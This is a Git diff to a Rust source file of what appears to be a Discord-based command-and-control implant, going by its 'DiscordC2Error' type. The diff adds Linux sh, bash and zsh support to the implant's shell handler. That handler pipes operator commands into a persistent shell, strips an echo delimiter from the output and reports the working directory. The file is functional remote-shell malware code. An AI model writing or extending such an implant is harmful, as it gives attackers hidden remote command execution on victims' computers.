@@ -1,6 +1,9 @@
 use crate::errors::DiscordC2Error;
 
-use std::{path::Path, process::Stdio, sync::Arc};
+use std::{process::Stdio, sync::Arc};
+
+#[cfg(target_os = "windows")]
+use std::path::Path;
 
 use tokio::{
     io::{AsyncBufReadExt, AsyncWriteExt, BufReader},
@@ -10,6 +13,7 @@ use tokio::{
 };
 
 use lazy_static::lazy_static;
+#[cfg(target_os = "windows")]
 use regex::Regex;
 use tracing::{info, warn, error};
 
@@ -17,6 +21,9 @@ use tracing::{info, warn, error};
 pub enum ShellType {
     Powershell,
     Cmd,
+    Sh,
+    Bash,
+    Zsh,
 }
 
 impl ShellType {
@@ -26,14 +33,17 @@ impl ShellType {
         match self {
             ShellType::Powershell => "powershell.exe",
             ShellType::Cmd => "cmd.exe",
+            ShellType::Sh => "sh",
+            ShellType::Bash => "bash",
+            ShellType::Zsh => "zsh",
         }
     }
 
     /// Formats the output `s` by removing the command delimter via the `.replace()` method.
     fn format_output(&self, s: &str) -> String {
         match self {
-            ShellType::Powershell => s.replace("; echo ___CMDDELIM___", ""),
             ShellType::Cmd => s.replace("& echo ___CMDDELIM___", ""),
+            _ => s.replace("; echo ___CMDDELIM___", ""),
         }
     }
 
@@ -91,10 +101,61 @@ impl ShellType {
                 process.stdin.as_mut().unwrap().flush().await?;
                 Ok(())
             }
+            ShellType::Sh => {
+                process
+                    .stdin
+                    .as_mut()
+                    .unwrap()
+                    .write_all(command.as_bytes())
+                    .await?;
+                process
+                    .stdin
+                    .as_mut()
+                    .unwrap()
+                    .write_all(b"; echo ___CMDDELIM___")
+                    .await?;
+                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
+                process.stdin.as_mut().unwrap().flush().await?;
+                Ok(())
+            }
+            ShellType::Bash => {
+                process
+                    .stdin
+                    .as_mut()
+                    .unwrap()
+                    .write_all(command.as_bytes())
+                    .await?;
+                process
+                    .stdin
+                    .as_mut()
+                    .unwrap()
+                    .write_all(b"; echo ___CMDDELIM___")
+                    .await?;
+                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
+                process.stdin.as_mut().unwrap().flush().await?;
+                Ok(())
+            }
+            ShellType::Zsh => {
+                process
+                    .stdin
+                    .as_mut()
+                    .unwrap()
+                    .write_all(command.as_bytes())
+                    .await?;
+                process
+                    .stdin
+                    .as_mut()
+                    .unwrap()
+                    .write_all(b"; echo ___CMDDELIM___")
+                    .await?;
+                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
+                process.stdin.as_mut().unwrap().flush().await?;
+                Ok(())
+            }
         }
     }
 
-    /// Retrieves the current working directory based on the shell type.
+    /// Retrieves the current working directory based on the shell type. We only need to use this function on Windows.
     ///
     /// ### Arguments
     ///
@@ -103,6 +164,7 @@ impl ShellType {
     /// ### Returns
     ///
     /// The current working directory as a `String`, or an error of type `DiscordC2Error` if there was a problem.
+    #[cfg(target_os = "windows")]
     async fn get_current_dir(&self, handler: &ProcessHandler) -> Result<String, DiscordC2Error> {
         let mut process = handler.process.lock().await;
 
@@ -140,6 +202,57 @@ impl ShellType {
                 process.stdin.as_mut().unwrap().write_all(b"\n").await?;
                 process.stdin.as_mut().unwrap().flush().await?;
                 Ok(ShellType::Cmd)
+            }
+            ShellType::Sh => {
+                process
+                    .stdin
+                    .as_mut()
+                    .unwrap()
+                    .write_all("cd".as_bytes())
+                    .await?;
+                process
+                    .stdin
+                    .as_mut()
+                    .unwrap()
+                    .write_all(b"; echo ___CMDDELIM___")
+                    .await?;
+                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
+                process.stdin.as_mut().unwrap().flush().await?;
+                Ok(ShellType::Sh)
+            }
+            ShellType::Bash => {
+                process
+                    .stdin
+                    .as_mut()
+                    .unwrap()
+                    .write_all("cd".as_bytes())
+                    .await?;
+                process
+                    .stdin
+                    .as_mut()
+                    .unwrap()
+                    .write_all(b"; echo ___CMDDELIM___")
+                    .await?;
+                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
+                process.stdin.as_mut().unwrap().flush().await?;
+                Ok(ShellType::Bash)
+            }
+            ShellType::Zsh => {
+                process
+                    .stdin
+                    .as_mut()
+                    .unwrap()
+                    .write_all("cd".as_bytes())
+                    .await?;
+                process
+                    .stdin
+                    .as_mut()
+                    .unwrap()
+                    .write_all(b"; echo ___CMDDELIM___")
+                    .await?;
+                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
+                process.stdin.as_mut().unwrap().flush().await?;
+                Ok(ShellType::Zsh)
             }
         };
 
@@ -287,21 +400,11 @@ impl ProcessHandler {
     pub async fn exit(&self) -> Result<(), DiscordC2Error> {
         let mut process = self.process.lock().await;
 
-        // Send an exit command to the process's stdin based on the shell type
-        let exit_command = match self.shell_type.as_str() {
-            "cmd.exe" => "exit",
-            "powershell.exe" => {
-                println!("Exiting the process");
-                "exit"
-            }
-            _ => panic!("Unsupported shell type"),
-        };
-
         process
             .stdin
             .as_mut()
             .unwrap()
-            .write_all(exit_command.as_bytes())
+            .write_all("exit".as_bytes())
             .await?;
         process.stdin.as_mut().unwrap().write_all(b"\n").await?;
         process.kill().await?;
@@ -312,8 +415,9 @@ impl ProcessHandler {
         Ok(())
     }
 
-    /// Retrieves the current working directory based on the shell type.
+    /// Retrieves the current working directory based on the shell type for Windows.
     /// Returns the working directory as a `String` if it exists, or an error of type `DiscordC2Error` if there was a problem.
+    #[cfg(target_os = "windows")]
     pub async fn current_working_directory(&self) -> Result<String, DiscordC2Error> {
         let formatted_output = self.shell_type.get_current_dir(self).await?;
 
@@ -346,6 +450,17 @@ impl ProcessHandler {
                 rexed
             )))
         }
+    }
+
+    /// Retrieves the current working directory based on the shell type for Linux.
+    /// Returns the working directory as a `String`, or an error of type `DiscordC2Error` if there was a problem.
+    #[cfg(target_os = "linux")]
+    pub async fn current_working_directory(&self) -> Result<String, DiscordC2Error> {
+        let pwd = std::env::var("PWD").map_err(|e| DiscordC2Error::VarError(e.to_string()))?; // shouldn't error tho
+
+        // error checking if the directory exists is not necessary as on linux you can rm -rf a directory and the shell
+        // will still keep you in that directory until you move out of it.
+        Ok(String::from(pwd))
     }
 }
 
